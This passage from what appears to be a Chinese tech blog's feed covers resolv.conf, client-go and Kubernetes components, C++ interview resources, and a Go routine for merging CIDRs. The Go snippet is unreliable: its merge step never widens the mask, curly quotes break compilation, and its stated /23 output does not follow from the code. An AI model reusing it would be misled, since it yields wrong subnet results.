System）服务器的配置信息，它告诉操作系统在哪里查找域名对应的IP地址。当用户在浏览器中输入一个域名时，操作系统会首先查看<code>/etc/resolv.conf</code>文件中的DNS服务器配置，然后向该DNS服务器发送查询请求，以获取域名对应的IP地址。</p><p>该文件由域名解析器（resolver，一个根据主机名解析IP地址的库）使用的配置文件，也是DNS域名解析的配置文件，其格式很简单，每行以一个关键字开头，后接配置参数。主要的关键字主要有四个，分别是：</p><ul><li><p>nameserver：定义DNS服务器的IP地址</p><p>表明DNS服务器的IP地址。可以有很多行的nameserver，每一个带一个IP地址。在查询时就按nameserver在本文件中的顺序进行，且只有当第一个nameserver没有反应时才查询下面的nameserver。</p></li><li><p>domain：定义本地域名</p><p>声明主机的域名。很多程序用到它，如邮件系统；当为没有域名的主机进行DNS查询时，也要用到。如果没有域名，主机名将被使用，删除所有在第一个点( .)前面的内容。</p></li><li><p>search：定义域名的搜索列表</p><p>它的多个参数指明域名查询顺序。当要查询没有域名的主机，主机将在由search声明的域中分别查找。domain和search不能共存；如果同时存在，后面出现的将会被使用。</p></li><li><p>sortlist：对返回的域名进行排序</p><p>允许将得到域名结果进行特定的排序。它的参数为网络&#x2F;掩码对，允许任意的排列顺序。</p></li></ul><p><strong>示例如下：</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">domain</span> <br>search  <br>nameserver <span class="hljs-number">8.8.8.8</span><br>nameserver <span class="hljs-number">8.8.4.4</span><br></code></pre></td></tr></table></figure><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>总的来说，<code>/etc/resolv.conf</code>和<code>/etc/hosts</code>文件都是非常重要的配置文件，它们可以帮助操作系统正确地解析域名和IP地址的对应关系，从而保证网络连接的正常运行。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>client-go架构与原理介绍</title>
    <link href="/2023/04/27/client-go%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/04/27/client-go%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="client-go架构与原理介绍"><a href="#client-go架构与原理介绍" class="headerlink" title="client-go架构与原理介绍"></a>client-go架构与原理介绍</h1><h2 id="一、架构展示"><a href="#一、架构展示" class="headerlink" title="一、架构展示"></a>一、架构展示</h2><p>client-go 库中的各种组件架构如下图所示：</p><p><img src="https://pic2.zhimg.com/80/v2-ebd721c9c5860db9b64865e6aaa01ffd_1440w.webp" alt="img"></p><h2 id="二、目录结构"><a href="#二、目录结构" class="headerlink" title="二、目录结构"></a>二、目录结构</h2><p>client-go 是用 Golang 语言编写的官方编程式交互客户端库，提供对 Kubernetes API server 服务的交互访问。</p><p>其源码目录结构如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>├── discovery                   <span class="hljs-comment"># 定义DsicoveryClient客户端。作用是用于发现k8s所支持GVR(Group, Version, Resources)。</span><br>├── dynamic                     <span class="hljs-comment"># 定义DynamicClient客户端。可以用于访问k8s Resources(如: Pod, Deploy...)，也可以访问用户自定义资源(即: CRD)。</span><br>├── informers                   <span class="hljs-comment"># k8s中各种Resources的Informer机制的实现。</span><br>├── kubernetes                  <span class="hljs-comment"># 定义ClientSet客户端。它只能用于访问k8s Resources。每一种资源(如: Pod等)都可以看成是一个客端，而ClientSet是多个客户端的集合，它对RestClient进行了封装，引入了对Resources和Version的管理。通常来说ClientSet是client-gen来自动生成的。</span><br>├── listers                     <span class="hljs-comment"># 提供对Resources的获取功能。对于Get()和List()而言，listers提供给二者的数据都是从缓存中读取的。</span><br>├── pkg                         <br>├── plugin                      <span class="hljs-comment"># 提供第三方插件。如：GCP, OpenStack等。</span><br>├── rest                        <span class="hljs-comment"># 定义RestClient，实现了Restful的API。同时会支持Protobuf和Json格式数据。</span><br>├── scale                       <span class="hljs-comment"># 定义ScalClient。用于Deploy, RS, RC等的扩/缩容。</span><br>├── tools                       <span class="hljs-comment"># 定义诸如SharedInformer、Reflector、DealtFIFO和Indexer等常用工具。实现client查询和缓存机制，减少client与api-server请求次数，减少api-server的压力。</span><br>├── transport<br>└── util                        <span class="hljs-comment"># 提供诸如WorkQueue、Certificate等常用方法。</span><br></code></pre></td></tr></table></figure><h3 id="2-1-RESTClient-客户端"><a href="#2-1-RESTClient-客户端" class="headerlink" title="2.1 RESTClient 客户端"></a>2.1 RESTClient 客户端</h3><p>RESTful Client 是最基础的客户端，它主要是对 HTTP 请求进行了封装，并且支持 JSON 和 Protobuf 格式数据。</p><h3 id="2-2-DynamicClient-客户端"><a href="#2-2-DynamicClient-客户端" class="headerlink" title="2.2 DynamicClient 客户端"></a>2.2 DynamicClient 客户端</h3><p>DynamicClient 是一种动态客户端，它可以动态的指定资源的组，版本和资源。因此它可以对任意 K8S 资源进行 RESTful 操作，包括 CRD 自定义资源。它封装了 RESTClient。所以同样提供 RESTClient 的各种方法。</p><p>具体使用方法，可参考官方示例：<a href="https://link.zhihu.com/?target=https://github.com/kubernetes/client-go/tree/master/examples/dynamic-create-update-delete-deployment">dynamic-create-update-delete-deployment</a>。</p><p><strong>注意</strong>: 该官方示例是基于集群外的环境，如果你需要在集群内部使用（例如你需要在 container 中访问），你将需要调用 <code>rest.InClusterConfig()</code> 生成一个 configuration。具体的示例请参考 <a href="https://link.zhihu.com/?target=https://github.com/kubernetes/client-go/tree/master/examples/in-cluster-client-configuration">in-cluster-client-configuration</a>。</p><h3 id="2-3-ClientSet-客户端"><a href="#2-3-ClientSet-客户端" class="headerlink" title="2.3 ClientSet 客户端"></a>2.3 ClientSet 客户端</h3><p>ClientSet 客户端在 RESTClient 的基础上封装了对资源和版本的管理方法。每个资源可以理解为一个客户端，而 ClientSet 则是多个客户端的集合，每一个资源和版本都以函数的方式暴露给开发者。</p><p>具体使用方法，可参考官方示例：<a href="https://link.zhihu.com/?target=https://github.com/kubernetes/client-go/tree/master/examples/create-update-delete-deployment">create-update-delete-deployment</a>。</p><h3 id="2-4-DiscoveryClient-客户端"><a href="#2-4-DiscoveryClient-客户端" class="headerlink" title="2.4 DiscoveryClient 客户端"></a>2.4 DiscoveryClient 客户端</h3><p>DiscoveryClient 是一个发现客户端，它主要用于发现 K8S API Server 支持的资源组，资源版本和资源信息。所以开发者可以通过使用 DiscoveryClient 客户端查看所支持的资源组，资源版本和资源信息。</p><h3 id="2-5-ClientSet-VS-DynamicClient"><a href="#2-5-ClientSet-VS-DynamicClient" class="headerlink" title="2.5 ClientSet VS DynamicClient"></a>2.5 ClientSet VS DynamicClient</h3><p>类型化 <code>ClientSets</code> 使得使用预先生成的本地 API 对象与 API 服务器通信变得简单，从而获得类似 <code>RPC</code> 的编程体验。类型化客户端使用程序编译来强制执行数据安全性和一些验证。然而，在使用类型化客户端时，程序被迫与所使用的版本和类型紧密耦合。</p><p>而 <code>DynamicClient</code> 则使用 <code>unstructured.Unstructured</code> 表示来自 API Server 的所有对象值。<code>Unstructured</code> 类型是一个嵌套的 <code>map[string]inferface&#123;&#125;</code> 值的集合来创建一个内部结构，该结构和服务端的 REST 负载非常相似。</p><p><code>DynamicClient</code> 将所有数据绑定推迟到运行时，这意味着程序运行之前，使用 <code>DynamicClient</code> 的的程序将不会获取到类型验证的任何好处。对于某些需要强数据类型检查和验证的应用程序来说，这可能是一个问题。</p><p>然而，松耦合意味着当客户端 API 发生变化时，使用 <code>DynamicClient</code> 的程序不需要重新编译。客户端程序在处理 API 表面更新时具有更大的灵活性，而无需提前知道这些更改是什么。</p><h2 id="三、组件介绍"><a href="#三、组件介绍" class="headerlink" title="三、组件介绍"></a>三、组件介绍</h2><p>下面对图中每个组件进行简单介绍：</p><p>​    <strong>client-go 组件：</strong></p><ol><li><p><strong>Reflector</strong>: 定义在 <a href="https://link.zhihu.com/?target=https://github.com/kubernetes/client-go/blob/master/tools/cache/reflector.go">&#x2F;tools&#x2F;cache 包内的 Reflector 类型</a> 中的 reflector 监视 Kubernetes API 以获取指定的资源类型 (Kind)。完成此操作的函数是 ListAndWatch。监视可以用于内建资源，也可以用于自定义资源。当 reflector 通过监视 API 的收到关于新资源实例存在的通知时，它使用相应的 listing API 获取新创建的对象，并将其放入 watchHandler 函数内的 Delta Fifo 队列中。</p></li><li><p><strong>Informer</strong>: 在 <a href="https://link.zhihu.com/?target=https://github.com/kubernetes/client-go/blob/master/tools/cache/controller.go">&#x2F;tools&#x2F;cache 包内的基础 controller</a> 中定义的一个 informer 从 Delta FIFO 队列中弹出对象。完成此操作的函数是 processLoop。这个基础 controller 的任务是保存对象以供以后检索，并调用 controller 将对象传递给它。</p></li><li><p><strong>Indexer</strong>: indexer 为对象提供索引功能。它定义在 <a href="https://link.zhihu.com/?target=https://github.com/kubernetes/client-go/blob/master/tools/cache/index.go">&#x2F;tools&#x2F;cache 包内的 Indexer 类型</a>。一个典型的索引用例是基于对象标签创建索引。Indexer 可以基于多个索引函数维护索引。Indexer 使用线程安全的数据存储来存储对象及其键值。在 <a href="https://link.zhihu.com/?target=https://github.com/kubernetes/client-go/blob/master/tools/cache/store.go">&#x2F;tools&#x2F;cache 包内的 Store 类型</a> 定义了一个名为 <code>MetaNamespaceKeyFunc</code> 的默认函数，该函数为该对象生成一个名为 <code>&lt;namespace&gt;/&lt;name&gt;</code> 组合的对象键值。</p><p><strong>Custom Controller 组件：</strong></p></li><li><p><strong>Informer reference</strong>: 这是一个知道如何使用自定义资源对象的 Informer 实例的引用。您的自定义控制器代码需要创建适当的 Informer。</p></li><li><p><strong>Indexer reference</strong>: 这是一个知道如何使用自定义资源对象的 Indexer 实例的引用。您的自定义控制器代码需要创建这个。您将使用此引用检索对象，以便稍后处理。</p></li><li><p><strong>Resource Event Handlers</strong>: 当 Informer 想要分发一个对象给你的控制器时，会调用这些回调函数。编写这些函数的典型模式是获取已分配对象的键值，并将该键值放入一个工作队列中进行进一步处理。</p></li><li><p><strong>Work queue</strong>: 这是在控制器代码中创建的队列，用于将对象的分发与处理解耦。编写 Resource Event Handler 函数来提取所分发对象的键值并将其添加到工作队列中。</p></li><li><p><strong>Process Item</strong>: 这是在代码中创建的处理 work queue 中的 items 的函数。可以有一个或多个其他函数来执行实际的处理。这些函数通常使用 <a href="https://link.zhihu.com/?target=https://github.com/kubernetes/client-go/blob/master/examples/workqueue/main.go%23L73">Indexer 引用</a> 或 Listing wrapper 来获取与键值对应的对象。</p></li></ol><h2 id="四、Custom-Controller"><a href="#四、Custom-Controller" class="headerlink" title="四、Custom Controller"></a>四、Custom Controller</h2><p><strong>自定义controller实现流程如下：</strong></p><p><img src="https://blogstatic.haohtml.com/uploads/2023/04/d2b5ca33bd970f64a6301fa75ae2eb22-2.png?x-oss-process=image/format,webp" alt="img"></p><p>相关实现案例可参考：<a href="https://github.com/trstringer/k8s-controller-custom-resource">https://github.com/trstringer/k8s-controller-custom-resource</a></p><h2 id="五、CRD资源与Controller和operator关系"><a href="#五、CRD资源与Controller和operator关系" class="headerlink" title="五、CRD资源与Controller和operator关系"></a>五、CRD资源与Controller和operator关系</h2><p>CRD（Custom Resource Definition）资源是一种自定义资源类型，允许用户在 Kubernetes 中定义自己的 API 对象。CRD 可以定义自己的 API 对象，这些对象可以像 Kubernetes 原生资源一样进行管理和操作。</p><p>在 Kubernetes 中，CRD 资源和 Controller 之间存在一种父子关系。CRD 资源定义了自己的 API 对象，而 Controller 可以通过监视这些对象来控制它们的状态。当 CRD 资源中的对象状态发生变化时，Controller 会根据变化的状态来执行相应的操作，以确保资源的状态与期望的状态一致。</p><p>例如，如果用户定义了一个名为 “MyResource” 的 CRD 资源，并创建了一个名为 “my-resource” 的对象，那么 Controller 可以监视这个对象，并在对象状态发生变化时执行相应的操作。如果对象状态发生变化，Controller 可以更新对象的状态，或者执行其他操作来确保资源的状态与期望的状态一致。</p><p>而Operator是一种在Kubernetes中使用Controller的特定类型。Operator是一种自动化Kubernetes管理的方式，它使用自定义控制器来管理应用程序的状态。Operator可以监视CRD资源，并在资源状态发生变化时自动执行操作。例如，如果您有一个CRD资源来表示您的应用程序的特定部署，Operator可以监视该资源，并在部署发生更改时自动更新应用程序的状态。Operator可以使用自定义控制器来执行这些操作，这些控制器可以使用Kubernetes API来管理Pod和其他资源的状态。</p><p>因此，CRD资源可以与Controller和Operator一起使用。您可以使用CRD来定义自己的自定义资源，然后使用Controller来管理这些资源的状态。或者，您可以使用Operator来监视CRD资源，并在资源状态发生变化时自动执行操作。无论您选择哪种方法，CRD资源都可以帮助您更好地管理Kubernetes中的应用程序。</p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>kubernetes 的设计理念是通过各种控制器将系统的实际运行状态协调到声明 API 中的期待状态。而这种协调机制就是基于 client-go 实现的。同样，kubernetes 对于 ETCD 存储的缓存处理也使用到了 client-go 中的 Reflector 机制。所以学好 client-go，等于迈入了 Kubernetes 的大门！相关源码分析可查看源码分析目录。</p><h2 id="七、参考链接"><a href="#七、参考链接" class="headerlink" title="七、参考链接"></a>七、参考链接</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/202611841">client-go 源码学习总结</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
      <tag>clint-go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go基于ip集合推出对应的CIDR</title>
    <link href="/2023/04/16/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E4%BA%8Eip%E9%9B%86%E5%90%88%E6%8E%A8%E5%87%BA%E5%AF%B9%E5%BA%94%E7%9A%84CIDR/"/>
    <url>/2023/04/16/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E4%BA%8Eip%E9%9B%86%E5%90%88%E6%8E%A8%E5%87%BA%E5%AF%B9%E5%BA%94%E7%9A%84CIDR/</url>
    
    <content type="html"><![CDATA[<h1 id="Go语言基于ip集合推出对应的CIDR"><a href="#Go语言基于ip集合推出对应的CIDR" class="headerlink" title="Go语言基于ip集合推出对应的CIDR"></a>Go语言基于ip集合推出对应的CIDR</h1><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>Go语言中可以基于net包中的CIDR函数来将一组IP地址转换为CIDR，步骤主要分两步：</p><ol><li>通过ip地址获取对应的ip和CIDR掩码信息，默认为32位</li><li>合并相邻CIDR子网</li></ol><p>实现代码如下：</p><h3 id="1-获取每个ip对应的CIDR"><a href="#1-获取每个ip对应的CIDR" class="headerlink" title="1.获取每个ip对应的CIDR"></a>1.获取每个ip对应的CIDR</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 通过ip地址获取对应的ip和CIDR掩码信息，默认为32位  </span><br>IPNet: net.IPNet&#123;<br>IP:   net.ParseIP(IPAddress),<br>        <span class="hljs-comment">//  用ones和bits来一个CIDR掩码</span><br>Mask: net.CIDRMask(IPOnes, <span class="hljs-number">32</span>),<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-合并子网CIDR"><a href="#2-合并子网CIDR" class="headerlink" title="2.合并子网CIDR"></a>2.合并子网CIDR</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MergeCIDRs</span><span class="hljs-params">(cidrs []*net.IPNet)</span></span> []*net.IPNet &#123;<br>    <span class="hljs-comment">// 先按照IP地址排序</span><br>    sort.Slice(cidrs, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>    <span class="hljs-keyword">return</span> bytes.Compare(cidrs[i].IP, cidrs[j].IP) &lt; <span class="hljs-number">0</span><br>    &#125;)<br><br><span class="hljs-comment">// 合并相邻的CIDR</span><br>mergedCIDRs := <span class="hljs-built_in">make</span>([]*net.IPNet, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cidrs))<br>currentCIDR := cidrs[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">len</span>(cidrs); i++ &#123;<br>    <span class="hljs-keyword">if</span> currentCIDR.Contains(cidrs[i].IP) &#123;<br>        <span class="hljs-keyword">continue</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> bytes.Equal(currentCIDR.Mask, cidrs[i].Mask) &amp;&amp; currentCIDR.IP.Equal(cidrs[i].IP.Mask(currentCIDR.Mask)) &#123;<br>        currentCIDR = &amp;net.IPNet&#123;<br>            IP:   currentCIDR.IP,<br>            Mask: currentCIDR.Mask,<br>        &#125;<br>        <span class="hljs-keyword">continue</span><br>    &#125;<br>    mergedCIDRs = <span class="hljs-built_in">append</span>(mergedCIDRs, currentCIDR)<br>    currentCIDR = cidrs[i]<br>&#125;<br>  mergedCIDRs = <span class="hljs-built_in">append</span>(mergedCIDRs, currentCIDR)<br><br>  <span class="hljs-keyword">return</span> mergedCIDRs<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-测试"><a href="#3-测试" class="headerlink" title="3.测试"></a>3.测试</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs golang">cidrs := []*net.IPNet&#123;<br>&amp;net.IPNet&#123;IP: net.ParseIP(“<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>”), Mask: net.CIDRMask(<span class="hljs-number">24</span>, <span class="hljs-number">32</span>)&#125;,<br>&amp;net.IPNet&#123;IP: net.ParseIP(“<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>”), Mask: net.CIDRMask(<span class="hljs-number">24</span>, <span class="hljs-number">32</span>)&#125;,<br>&amp;net.IPNet&#123;IP: net.ParseIP(“<span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.0</span>”), Mask: net.CIDRMask(<span class="hljs-number">24</span>, <span class="hljs-number">32</span>)&#125;,<br>&amp;net.IPNet&#123;IP: net.ParseIP(“<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>”), Mask: net.CIDRMask(<span class="hljs-number">25</span>, <span class="hljs-number">32</span>)&#125;,<br>&amp;net.IPNet&#123;IP: net.ParseIP(“<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.128</span>”), Mask: net.CIDRMask(<span class="hljs-number">25</span>, <span class="hljs-number">32</span>)&#125;,<br>&#125;<br>mergedCIDRs := MergeCIDRs(cidrs)<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> mergedCIDRs &#123;<br>fmt.Printf(“%s\n”, c.String())<br>&#125;<br>输出结果为：<br><span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">23</span><br><span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++面试准备</title>
    <link href="/2023/04/08/C-%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    <url>/2023/04/08/C-%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<h2 id="一、简历编写"><a href="#一、简历编写" class="headerlink" title="一、简历编写"></a>一、简历编写</h2><p>  1.怎么写好简历：<a href="https://github.com/resumejob/awesome-resume">https://github.com/resumejob/awesome-resume</a></p><p>  2.比较好的简历模板（可以直接用牛客，简单明了就行）：<a href="https://github.com/CyC2018/Markdown-Resume">https://github.com/CyC2018/Markdown-Resume</a></p><p>  3.写简历需要写什么：<a href="https://github.com/geekcompany/ResumeSample/blob/master/c.md">https://github.com/geekcompany/ResumeSample/blob/master/c.md</a></p><h2 id="二、面经"><a href="#二、面经" class="headerlink" title="二、面经"></a>二、面经</h2><blockquote><p>可以找小公司多积累面试经验，不要等“完全准备好”再面试，面试就是不断学习的过程；</p></blockquote><ol><li>C++面试&amp;C++学习指南：<a href="https://github.com/youngyangyang04/TechCPP">https://github.com/youngyangyang04/TechCPP</a></li><li>C&#x2F;C++ 技术面试基础知识总结（这个全面一点）：<a href="https://github.com/huihut/interview">https://github.com/huihut/interview</a></li><li>技术面试必备基础知识、Leetcode、计算机操作系统、计算机网络、系统设计：<a href="https://github.com/CyC2018/CS-Notes">https://github.com/CyC2018/CS-Notes</a></li></ol><h2 id="三、项目经历"><a href="#三、项目经历" class="headerlink" title="三、项目经历"></a>三、项目经历</h2><blockquote><p>项目没有的话，开源直接参考开源项目，模仿或者基于开源项目加功能就行，只能面试能够答出来，了解相关细节实现即可；</p></blockquote><p>这个相关语言的排行榜，可以自己找合适自己的项目：<a href="https://github.com/GrowingGit/GitHub-Chinese-Top-Charts">https://github.com/GrowingGit/GitHub-Chinese-Top-Charts</a></p><p>推荐开源项目：</p><p>   1.搜狗公司C++服务器引擎（复杂程度较高，认可度大）：<a href="https://github.com/GrowingGit/GitHub-Chinese-Top-Charts/blob/master/content/charts/growth/software/CPP.md">https://github.com/GrowingGit/GitHub-Chinese-Top-Charts/blob/master/content/charts/growth/software/CPP.md</a></p><p>   2.c++语言编写的工业级RPC框架（需要对RPC有一定了解，认可度大）：<a href="https://github.com/apache/brpc">https://github.com/apache/brpc</a></p><p>   3.笔记平台（相对来说比较简单，认可度相对其他较一般）：<a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p><p>   4.基于名称服务和 Tars 协议的高性能 RPC 框架，也是集成的管理平台，通过灵活的调度实现托管服务。：<a href="https://github.com/TarsCloud/Tars">https://github.com/TarsCloud/Tars</a></p><p>   5.全平台原生c#热更方案（技术文档比较详细）：<a href="https://github.com/tuyoogame/huatuo">https://github.com/tuyoogame/huatuo</a></p>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>C++</tag>
      
      <tag>面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes集群架构与组件介绍</title>
    <link href="/2023/04/07/Kubernetes%E9%9B%86%E7%BE%A4%E6%9E%B6%E6%9E%84%E4%B8%8E%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/04/07/Kubernetes%E9%9B%86%E7%BE%A4%E6%9E%B6%E6%9E%84%E4%B8%8E%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="Kubernetes集群架构与组件介绍"><a href="#Kubernetes集群架构与组件介绍" class="headerlink" title="Kubernetes集群架构与组件介绍"></a>Kubernetes集群架构与组件介绍</h1><h2 id="一、集群架构"><a href="#一、集群架构" class="headerlink" title="一、集群架构"></a>一、集群架构</h2><p><img src="https://s2.loli.net/2023/04/05/NJErpDqHkXifKZb.png" alt="集群架构"></p><h2 id="二、主要组件"><a href="#二、主要组件" class="headerlink" title="二、主要组件"></a>二、主要组件</h2><h3 id="1-kubelet"><a href="#1-kubelet" class="headerlink" title="1.kubelet"></a>1.kubelet</h3><p>该组件运行在每个Kubernetes节点上，用于管理节点。用来接收、处理、上报kube-apiserver组件下发的任务。</p><p>主要负责所在节点上的Pod资源对象的管理，例如Pod资源对象的创建、修改、监控、删除、驱逐及Pod生命周期管理等。 kubelet组件会定期监控所在节点的资源使用状态并上报给kube-apiserver组件，这些资源数据可以帮助kube-scheduler调度器为Pod资源对象预选节点。kubelet也会对所在节点的镜像和容器做清理工作，保证节点上的镜像不会占满磁盘空间、删除的容器释放相关资源。 kubelet组件实现了3种开放接口：</p><ul><li>Container Runtime Interface：简称CRI（容器运行时接口）提供容器运行时通用插件接口服务。CRI定义了容器和镜像服务的接口。CRI将kubelet组件与容器运行时进行解耦，将原来完全面向Pod级别的内部接口拆分成面向Sandbox和Container的gRPC接口，并将镜像管理和容器管理分离给不同的服务。</li><li>Container Network Interface：简称CNI（容器网络接口），提供网络通用插件接口服务。CNI定义了Kubernetes网络插件的基础，容器创建时通过CNI插件配置网络。</li><li>Container Storage Interface：简称CSI（容器存储接口），提供存储通用插件接口服务。CSI定义了容器存储卷标准规范，容器创建时通过CSI插件配置存储卷。</li></ul><h3 id="2-client-go"><a href="#2-client-go" class="headerlink" title="2.client-go"></a>2.client-go</h3><p>client-go是从Kubernetes代码中抽离出来的包，作为官方提供的GO语言的客户端发挥作用。client-go简单、易用，Kubernetes系统的其他组件与Kubernetes API Server通信的方式也是基于client-go实现。</p><h3 id="3-kube-apiserver"><a href="#3-kube-apiserver" class="headerlink" title="3.kube-apiserver"></a>3.kube-apiserver</h3><p>在 Kubernetes 中，API 服务器是 Kubernetes <a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 该组件公开了 Kubernetes API，API Server 是整个系统的核心组件之一，它是 Kubernetes API 的前端。API Server 接收 RESTful API 请求，并根据请求的内容执行相应的操作，比如创建、更新或删除资源对象。API Server 还负责对请求进行身份验证、授权和准入控制等安全相关的操作，以确保 Kubernetes 系统的安全性。</p><p>API Server 的另一个重要作用是提供了一个统一的入口，使得 Kubernetes 中的各个组件可以相互通信和协作。除了 Kubernetes 自身的组件，第三方开发的工具和应用程序也可以通过 API Server 访问 Kubernetes API，以实现对 Kubernetes 集群的管理和监控等操作。</p><p>总之，API Server 是 Kubernetes 系统中非常重要的组件之一，它为整个系统提供了一个统一的入口和管理接口，使得 Kubernetes 的各个组件可以相互协作，从而实现对 Kubernetes 集群的管理和监控等操作。</p><p>kube-apiserver组件也是集群中唯一与Etcd集群进行交互的核心组件。Kubernetes将所有的数据存储在Etcd集群中前缀为registry的目录下。 kube-apiserver的特性：</p><ul><li>将Kubernetes系统中所有资源对象都封装成RESTful风格的API接口进行管理。</li><li>可进行集群状态管理和数据管理，是唯一与Etcd集群交互的组件。</li><li>拥有丰富的集群安  全访问机制，以及认证，授权及准入控制器。</li><li>提供了集群各组件的通信和交互功能。</li></ul><h3 id="4-kube-controller-manager"><a href="#4-kube-controller-manager" class="headerlink" title="4.kube-controller-manager"></a>4.kube-controller-manager</h3><p>它负责管理Kubernetes集群中的节点（Node），Pod副本，服务，端点（Endpoint），命名空间（Namespace），服务账户（ServiceAcconut)，资源定额（ResourceQuota）等。</p><p>包括：</p><ul><li>节点控制器（Node Controller）：负责在节点出现故障时进行通知和响应</li><li>任务控制器（Job Controller）：监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成</li><li>端点分片控制器（EndpointSlice controller）：填充端点分片（EndpointSlice）对象（以提供 Service 和 Pod 之间的链接）。</li><li>服务账号控制器（ServiceAccount controller）：为新的命名空间创建默认的服务账号（ServiceAccount）。</li></ul><h3 id="5-kube-scheduler"><a href="#5-kube-scheduler" class="headerlink" title="5.kube-scheduler"></a>5.kube-scheduler</h3><p>该组件是Kubernetes集群默认的调度器，它负责在Kubernetes集群中为一个Pod资源对象找到合适的节点并在该节点上运行。在调度的过程中每次只负责调度一个Pod资源对象。调度算法分为两种，分别为预选调度算法和优选调度算法。</p><h3 id="6-kubectl"><a href="#6-kubectl" class="headerlink" title="6.kubectl"></a>6.kubectl</h3><p>kubectl是Kubernetes官方提供的命令行工具CLI，用户可以通过命令行的方式与Kubernetes API Server进行操作，通信协议使用HTTP&#x2F;JSON。</p><h3 id="7-kube-proxy"><a href="#7-kube-proxy" class="headerlink" 